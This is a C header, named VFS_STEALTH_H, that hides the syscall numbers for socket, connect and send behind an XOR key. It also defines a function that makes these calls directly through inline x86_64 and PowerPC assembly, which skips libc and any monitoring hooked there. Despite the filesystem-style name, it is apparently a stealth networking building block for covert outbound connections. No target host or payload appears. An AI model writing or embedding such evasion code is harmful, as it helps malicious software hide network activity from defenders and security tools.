#ifndef VFS_STEALTH_H
#define VFS_STEALTH_H

#include <stdint.h>
#include <stdarg.h>

#define VFS_XOR_KEY 0xAA
#define _(n) ((long)n ^ VFS_XOR_KEY)

#ifdef __linux__
    #define VFS_SYS_SOCKET  _(41)
    #define VFS_SYS_CONNECT _(42)
    #define VFS_SYS_SEND    _(44)
#elif defined(_AIX)
    #define VFS_SYS_SOCKET  _(143)
    #define VFS_SYS_CONNECT _(144)
    #define VFS_SYS_SEND    _(146)
#endif

#ifdef __cplusplus
extern "C" {
#endif

__attribute__((visibility("default"))) __attribute__((used))
long vfs_syscall(long n, long a1, long a2, long a3, long a4, long a5) {
    long ret;
    long s = n ^ VFS_XOR_KEY;
#if defined(__x86_64__)
    __asm__ volatile ("movq %1,%%rax; movq %2,%%rdi; movq %3,%%rsi; movq %4,%%rdx; movq %5,%%r10; movq %6,%%r8; syscall" 
        : "=a"(ret) : "r"(s),"r"(a1),"r"(a2),"r"(a3),"r"(a4),"r"(a5) : "rcx","r11","memory");
#elif defined(__powerpc__) || defined(__PPC__)
    __asm__ volatile ("mr 0,%1; mr 3,%2; mr 4,%3; mr 5,%4; mr 6,%5; mr 7,%6; sc; mr %0,3" 
        : "=r"(ret) : "r"(s),"r"(a1),"r"(a2),"r"(a3),"r"(a4),"r"(a5) : "r0","r3","r4","r5","r6","r7","memory");
#endif
    return ret;
}

#ifdef __cplusplus
}
#endif
#endif